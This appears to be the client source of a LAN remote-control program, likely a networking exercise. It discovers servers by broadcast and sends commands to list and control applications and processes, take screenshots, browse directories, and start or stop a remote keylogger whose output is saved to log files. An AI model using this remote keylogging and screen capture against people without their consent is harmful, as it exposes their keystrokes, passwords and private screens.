#include "Client.h"

#include <cstring>
#include <iostream>
#include <filesystem>
#include <mutex>

#include "../Message/Request.h"
#include "../Message/Response.h"
#include "../Utils/InUtils.h"
#include "../Utils/ConvertUtils.h"

Client::Client(){
    #ifdef _WIN32
        WSADATA wsaData;
        auto wVersionRequested = MAKEWORD(2, 2); // Get version of winsock
        int retCode = WSAStartup(wVersionRequested, &wsaData);

        if (retCode != 0)
            std::cout << "Startup failed: " << retCode << "\n";
            
        std::cout << "Return Code: " << retCode << "\n";
        std::cout << "Version Used: " << (int) LOBYTE(wsaData.wVersion) << "." << (int) HIBYTE(wsaData.wVersion) << "\n";
        std::cout << "Version Supported: " << (int) LOBYTE(wsaData.wHighVersion) << "." << (int) HIBYTE(wsaData.wHighVersion) << "\n";
        std::cout << "Implementation: " << wsaData.szDescription << "\n";
        std::cout << "System Status: " << wsaData.szSystemStatus << "\n";
        std::cout << "\n";

        if(LOBYTE(wsaData.wVersion) != LOBYTE(wVersionRequested) || HIBYTE(wsaData.wVersion) != HIBYTE(wVersionRequested)){
            std::cout << "Supported Version is too low.\n";
            WSACleanup();
            exit(0);
        }

        std::cout << "WSAStartup sucess.\n\n";
    #endif

    int idServer; 
    std::vector <std::string> servers;

    do{
        retCode = this->discover(servers);
        if (retCode == -1) 
            exit(1);
        std::cout << "Found following server:\n";
        for(int i = 0; i < servers.size(); ++i)
            std::cout << i + 1 << ". " << servers[i] << "\n";
        std::cout << servers.size() + 1 << ". " << "Retry.\n";
        do{
            std::cout << "Choose server to connect: ";
            std::cin >> idServer;
        }while(idServer < 1 || idServer > servers.size() + 1) ;
    }while(idServer == servers.size() + 1);

    this->_serverName = servers[idServer - 1];

    addrinfo hints, *servinfo;
    int status, yes = 1;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if ((status = getaddrinfo(this->_serverName.c_str(), SERVER_PORT, &hints, &servinfo)) != 0){
        std::cerr << "Client: getaddrinfo " << gai_strerror(status) << "\n";
        exit(1);
    }

    addrinfo *p = servinfo;
    for (;p != NULL; p = p->ai_next){
        this->sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (this->sockfd == INVALID_SOCKET){
            std::cerr << "Client: socket\n";
            continue;
        }
        int status = connect(this->sockfd, p->ai_addr, p->ai_addrlen);
        if (status == SOCKET_ERROR){
            std::cerr << "Client: connect\n";
            close(this->sockfd);
            continue;
        }
        break;
    }
    freeaddrinfo(servinfo);

    if (p == NULL){
        std::cerr << "Error: Fail to connect\n";
        exit(1);
    }
    std::cout << "Client: Connected to server.\n";
}

Client::~Client(){
    if(this->_keylogThread.joinable())
        this->stopKeyLog();
    close(this->sockfd);
    #ifdef _WIN32
        WSACleanup();
    #endif
}

int Client::discover(std::vector<std::string> &servers){
    servers.clear();
    int status;
    SOCKET disfd;
    int yes = 1;
    sockaddr_storage serverAddr;
    socklen_t addrlen = sizeof(serverAddr);
    addrinfo hints, *addr;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_flags = AI_PASSIVE;

    status = getaddrinfo(NULL, "0", &hints, &addr);
    if (status != 0){
        std::cerr << "Client: getaddrinfo: " << gai_strerror(status) << "\n";
        return -1;
    }

    addrinfo *p = addr;
    for (;p != NULL; p = p->ai_next){
        disfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (disfd == INVALID_SOCKET){
            std::cerr << "Client: socket\n";
            continue;
        }

        int status = setsockopt(disfd, SOL_SOCKET, SO_BROADCAST, (char*)&yes, sizeof(yes));
        if (status == SOCKET_ERROR){
            std::cerr << "Client: setsockopt\n";
            freeaddrinfo(addr);
            return -1;
        }

        status = setsockopt(disfd, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes));
        if (status == SOCKET_ERROR){
            std::cerr << "Client: setsockopt\n";
            freeaddrinfo(addr);
            close(disfd);
            return -1;
        }

        status = bind(disfd, p->ai_addr, p->ai_addrlen);
        if (status == SOCKET_ERROR){
            std::cerr << "Client: bind\n";
            close(disfd);
            continue;
        }
        break;
    }

    if (p == NULL){
        std::cerr << "Client: Fail to bind socket\n";
        freeaddrinfo(addr);
        return -1;
    }

    std::cout << "Broadcast discover message from " << getIpStr(p->ai_addr) << "::"; 
    std::cout << ntohs(((sockaddr_in *)p->ai_addr)->sin_port) << "\n";

    freeaddrinfo(addr);
    status = getaddrinfo("255.255.255.255", SERVER_PORT, &hints, &addr);
    if (status != 0){
        std::cerr << "Client: getaddrinfo: " << gai_strerror(status) << "\n";
        return -1;
    }
    p = addr;
    std::cout << "Broadcast discover message to " << getIpStr(p->ai_addr) << "::"; 
    std::cout << ntohs(((sockaddr_in *)p->ai_addr)->sin_port) << "\n";
    if (p == NULL){
        std::cerr << "Client: broadcast fail\n";
        freeaddrinfo(addr);
        return -1;
    }

    Request msg(DISCOVER_REQUEST, 0, NULL);
    sendtoRequest(disfd, msg, 0, p->ai_addr, p->ai_addrlen);
    freeaddrinfo(addr);

    WSAPOLLFD pfds[1];
    pfds[0].events = POLLIN;
    pfds[0].fd = disfd;
    while(true){
        int rv = WSAPoll(pfds, 1, 1000);
        if (rv == -1){
            std::cerr << "poll\n";
            close(disfd); 
            return -1;
        }
        if (rv == 0){ // time out
            std::cout << "Time out...\n\n";
            break;
        }
        
        Response buffer;
        addrlen = sizeof(serverAddr);
        int retCode = recvfromResponse(disfd, buffer, 0, (sockaddr*)&serverAddr, &addrlen);
        if(retCode == -1)
            continue;
        if (buffer.type() == DISCOVER_RESPONSE)
            servers.push_back(getIpStr((sockaddr*) &serverAddr));
    }
    close(disfd);
    return 0;
}

void Client::recvKeylog(){
    pollfd fds[1];
    fds[0].fd = this->_keylogfd;
    fds[0].events = POLLIN;
    while (1)
    {
        int rv = WSAPoll(fds, 1, -1);
        if (rv == -1)
        {
            std::cerr << "keylog poll error\n";
            break;
        }
        std::mutex m;
        std::lock_guard l(m);
        Response res;
        if (recvResponse(this->_keylogfd, res, 0))
        {
            close(this->_keylogfd);
            break;
        }
        this->_keylogFile << (char*) res.data() << std::flush;
    }
}

int Client::listApp(){
    Request requestToServer(LIST_APP_REQUEST, 0, NULL);
    int status = sendRequest(this->sockfd, requestToServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    Response responseFromServer;
    status = recvResponse(this->sockfd, responseFromServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    if(responseFromServer.errCode() == FAIL_CODE)
        return SOCKET_ERROR;

    std::cout << (char*) responseFromServer.data() << '\n';
    return 0;
}

int Client::startApp(const char *appName){
    Request requestToServer(START_APP_REQUEST, strlen(appName) + 1, (void*)appName);
    int status = sendRequest(this->sockfd, requestToServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    Response responseFromServer;
    status = recvResponse(this->sockfd, responseFromServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    if(responseFromServer.errCode() == FAIL_CODE){
        std::cout << "Client: Can't start " << appName << ".\n";
        return -1;
    }

    std::cout << "Client: Started " << appName << ".\n";
    return 0;
}

int Client::stopApp(const char *appName){
    Request requestToServer(STOP_APP_REQUEST, strlen(appName) + 1, (void*)appName);
    int status = sendRequest(this->sockfd, requestToServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    Response responseFromServer;
    status = recvResponse(this->sockfd, responseFromServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    if(responseFromServer.errCode() == FAIL_CODE){
        std::cout << "Client: Can't stop " << appName << ".\n";
        return -1;
    }

    std::cout << "Client: Stopped " << appName << ".\n";
    return 0;
}

int Client::listProcesss(){
    Request requestToServer(LIST_PROC_REQUEST, 0, NULL);
    int status = sendRequest(this->sockfd, requestToServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    Response responseFromServer;
    status = recvResponse(this->sockfd, responseFromServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    if(responseFromServer.errCode() == FAIL_CODE)
        return -1;

    std::cout << (char*) responseFromServer.data() << '\n';
    return 0;
}

int Client::screenShot(){
    Request requestToServer(SCREENSHOT_REQUEST, 0, NULL);
    int status = sendRequest(this->sockfd, requestToServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    Response responseFromServer;
    status = recvResponse(this->sockfd, responseFromServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    if(responseFromServer.errCode() == FAIL_CODE)
        return -1;

    std::ofstream fo("screenShotFromServer.png", std::ios::binary);
    if(fo.fail()){
        std::cerr << "Client: Can't create file screenshot png.\n";
        return -1;
    }
    fo.write((char*)responseFromServer.data(), responseFromServer.length());
    fo.close();
    std::cout << "Client: Created screenShotFromServer.png from installed data.\n";
    return 0;
}

int Client::startKeyLog(){
    if (this->_keylogThread.joinable())
        return -1;
    Request req(START_KEYLOG_REQUEST, 0, NULL);
    addrinfo hints, *servinfo;
    int status;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if ((status = getaddrinfo(this->_serverName.c_str(), SERVER_PORT, &hints, &servinfo)) != 0){
        std::cerr << "client: getaddrinfo " << gai_strerror(status) << "\n";
        exit(1);
    }

    addrinfo *p = servinfo;
    for (;p != NULL; p = p->ai_next)
    {
        if ((this->_keylogfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
        {
            perror("client: socket");
            continue;
        }
        if (connect(this->_keylogfd, p->ai_addr, p->ai_addrlen) == -1)
        {
            perror("client: connect");
            continue;
        }
        break;
    }
    freeaddrinfo(servinfo);
    if (p == NULL){
        std::cerr << "client: fail to connect\n";
        exit(1);
    }


    if (sendRequest(this->_keylogfd, req, 0)){
        close(this->_keylogfd);
        return -1;
    }
    Response res;
    if (recvResponse(this->_keylogfd, res, 0)){
        close(this->_keylogfd);
        return -1;
    }
    if (res.errCode() == FAIL_CODE || res.type() != CMD_RESPONSE_EMPTY)
    {
        close(this->_keylogfd);
        return -1;
    }
    int cnt = 0;
    std::ostringstream ss;
    ss << "keylog" << cnt << ".log";
    while (std::filesystem::exists(std::filesystem::path(ss.str())))
    {
        ss.str("");
        ss << "keylog" << ++cnt << ".log";
    }
    this->_keylogFile.open(ss.str());
    this->_keylogThread = std::thread(&Client::recvKeylog, this);
    return 0;
}

int Client::stopKeyLog(){
    if (!this->_keylogThread.joinable())
        return -1;
    Request req(STOP_KEYLOG_REQUEST, 0, NULL);
    if (sendRequest(this->_keylogfd, req, 0))
        return -1;
    Response res;
    if (recvResponse(this->_keylogfd, res, 0))
        return -1;
    if (res.errCode() == FAIL_CODE || res.type() != CMD_RESPONSE_EMPTY)
        return -1;
    this->_keylogThread.join();
    return 0;
}

int Client::dirTree(const char* pathName){
    Request requestToServer(DIR_TREE_REQUEST, strlen(pathName) + 1, (void*)pathName);
    int status = sendRequest(this->sockfd, requestToServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    Response responseFromServer;
    status = recvResponse(this->sockfd, responseFromServer, 0);
    if(status == SOCKET_ERROR)
        return SOCKET_ERROR;

    if(responseFromServer.errCode() == FAIL_CODE){
        std::cout << "Client: Can't list directory tree with root " << pathName << ".\n";
        return -1;
    }

    std::cout << (char*) responseFromServer.data() << '\n';
    return 0;
}
